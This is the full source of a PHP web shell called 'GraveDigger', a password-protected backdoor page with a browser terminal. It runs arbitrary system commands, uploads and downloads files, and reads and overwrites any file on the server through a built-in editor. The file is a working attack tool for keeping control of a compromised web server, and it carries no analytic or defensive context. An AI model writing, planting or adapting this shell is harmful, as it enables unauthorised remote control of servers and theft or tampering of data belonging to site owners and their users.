<?php
$passwd_="a432ac49416f47e646fc2186091050f9";
//////////////////IDE

if(isset($_POST["ide"])){
    if(!isset($_POST["passwd"]) || md5($_POST["passwd"])!=$passwd_){
        die("[shell pass error]");
    }
    function str_to_utf8 ($string) { 
        if (mb_detect_encoding($string, 'UTF-8', true) === false) {
          $string = utf8_encode($string); 
        } 
        return $string; 
    }
    if(isset($_POST["file_name"] ) && trim($_POST["file_name"])!="" && isset($_POST["file_content"]) && $_POST["file_content"]!="" ){
        $file_name    = trim($_POST["file_name"] );
        $file_content = trim($_POST["file_content"] );
            file_put_contents($file_name, str_to_utf8(urldecode(base64_decode($file_content))) );
            die("1");
    }
    if(isset($_POST["file_name"] ) && trim($_POST["file_name"])!=""){
        $file_name    = trim($_POST["file_name"] );
        die(file_get_contents($file_name));
    }
}

/////////////////
exec("alias ll='ls -l'");
function featureShell($cmd, $cwd) {
    $stdout = array();
	if (preg_match("/^\s*ll\s+/", $cmd)) {
		$cmd = preg_replace("/^\s*ll\s+/", "ls -l ", $cmd);
	}
    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;
    $passwd= isset($_POST['shellpass']) ? $_POST['shellpass'].trim() :"";
    if(md5($passwd)!=$passwd_){
        header("Content-Type: application/json");
        $out= array(
            "stdout" => array("Wrong GD password : set shellpass [PASSWRD]"),
            "cwd" => getcwd()
        );
        die(json_encode($out));
    }
    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>GraveDigger:#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }
            #editor{
                background: #222;
                max-width: 900px;
                font-size: 10pt;
                top: 20px;
                left: 100px;
                display:none;            
                position: fixed;
                width: 900px;
                height: 800px;
                top: 50%;
                left: 50%;
                margin-top: -400px; /* Negative half of height. */
                margin-left: -450px; /* Negative half of width. */
                
            }
            #shell {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            @media (max-width: 991px) {
                #shell-logo {
                    display: none;
                }

                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #shell {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
        </style>

        <script>
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;
            var shellpass = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function featureShell(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion

                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return "GraveDigger:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = response.cwd;
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        if(eShellCmdInput.value.includes("set shellpass")){
                            shellpass = eShellCmdInput.value.replace("set shellpass","").trim();
                        }else if(eShellCmdInput.value.split(" ")[0].trim()=="ide"){
                            document.getElementById("file_name").value=eShellCmdInput.value.split(" ")[1].trim();
                            loadfile_shell();
                        }else if(eShellCmdInput.value.split(" ")[0].trim()=="ide"){
                            
                        }
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.value = "";
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                if(cmd.trim()!=""){
                    commandHistory.push(cmd);
                    historyPosition = commandHistory.length;
                }
            }

            function makeRequest(url, params, callback) {
                params["shellpass"] = shellpass;
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
            
        </script>
<script src="https://www.cdolivet.com/editarea/editarea/edit_area/edit_area_full.js"></script>
	<script language="Javascript" type="text/javascript">
		// initialisation
        function loadfile_shell(){
            editAreaLoader.init({
                id: "file_content"	// id of the textarea to transform	
                ,start_highlight: true	
                ,font_size: "9"
                ,font_family: "verdana, monospace"
                ,allow_resize: "y"
                ,allow_toggle: false
                ,language: "en"
                ,syntax: "css"	
                ,toolbar: "new_document, save, load, |, charmap, |, search, go_to_line, |, undo, redo, |, select_font, |, change_smooth_selection, highlight, reset_highlight, |, help, |,syntax_selection"
                ,load_callback: "my_load"
                ,save_callback: "my_save"
                ,plugins: "charmap"
                ,charmap_default: "arrows"
                    
            });
            my_load('file_content');
            document.getElementById("editor").style.display = "block";
            setTimeout(function(){select_syntax_lang();},1000);
        }

function utf8_to_b64( str ) {
    return window.btoa(encodeURIComponent( str ));
}
		// callback functions
		function my_save(id, content){
			  var xhttp = new XMLHttpRequest();
			  xhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
				  document.getElementById("editor_output").innerHTML = this.responseText;
				  if(this.responseText == "1"){
				      var iframe = document.getElementById('frame_file_content');
				      var innerDoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
				      var save_btn = innerDoc .getElementById('save');
				      
				      document.getElementById("editor_output").innerHTML  = "<img src = '"+save_btn.src+"' ></img>";
				      setTimeout(function(){
					      var iframe = document.getElementById('frame_file_content');
					      var innerDoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
					      var save_btn = innerDoc .getElementById('save');
					      
					      document.getElementById("editor_output").innerHTML  = "";
				      },2000);
				  }
				}
			  };
  
			console.log(utf8_to_b64(content));
			const file_name = encodeURI(document.getElementById("file_name").value);
			xhttp.open("POST", "<?php echo $main_script; ?>?token=imad", true);
			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xhttp.send("ide=1&passwd="+shellpass+"&file_name="+file_name+"&file_content="+utf8_to_b64(content) );
			//alert("Here is the content of the EditArea '"+ id +"' as received by the save callback function:\n"+content+(typeof content));
		}
		function select_syntax_lang(){
           const file_name = encodeURI(document.getElementById("file_name").value);
		    var iframe = document.getElementById('frame_file_content');
		    var innerDoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
		    var choices = innerDoc .getElementById('syntax_selection');
            const file_ext = file_name .split(".")[file_name .split(".").length-1] ;
		    for(let i=0;i<choices .length;i++){
		        if( choices [i].value == file_ext  ){
		            choices [i].selected = true;
		            
		        }
		    }
		    //choices .fireEvent("onchange");
            var event = new Event('change');
            choices.dispatchEvent(event);
		}
		function my_load(id){
            editAreaLoader.setValue(id, "");
			  var xhttp = new XMLHttpRequest();
			  xhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
				  //document.getElementById("output").innerHTML = this.responseText;
				  editAreaLoader.setValue(id, this.responseText);
				  select_syntax_lang();
				}
			  };
  
			console.log(utf8_to_b64(content));
			const file_name = encodeURI(document.getElementById("file_name").value);
			xhttp.open("POST", "<?php echo $main_script; ?>?token=<?php echo $token ?>", true);
			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xhttp.send("ide=1&passwd="+shellpass+"&file_name="+file_name );
			
		}
		
		
		function toogle_editable(id)
		{
			editAreaLoader.execCommand(id, 'set_editable', !editAreaLoader.execCommand(id, 'is_editable'));
		}


    
	</script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
  _____                  ___  _                  <span></span>
 / ___/______ __  _____ / _ \(_)__ ____ ____ ____<span></span>
/ (_ / __/ _ `/ |/ / -_) // / / _ `/ _ `/ -_) __/<span></span>
\___/_/  \_,_/|___/\__/____/_/\_, /\_, /\__/_/   <span></span>
                             /___//___/          <span></span>     
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
        
        
        <div id="editor" >
            <div>
            <input type="text" name="file_name" id="file_name" value="" />
            <span id="editor_output" style="background:#fff"></span>
            <spane style='float: right;' onClick="document.getElementById('editor').style.display = 'none'">X</span>
            
            </div>
            <textarea id="file_content" style="height: 90%; width: 100%;" name="file_content">
            </textarea>
        </div>
    </body>

</html>
<script>
(function() {

})();
</script>
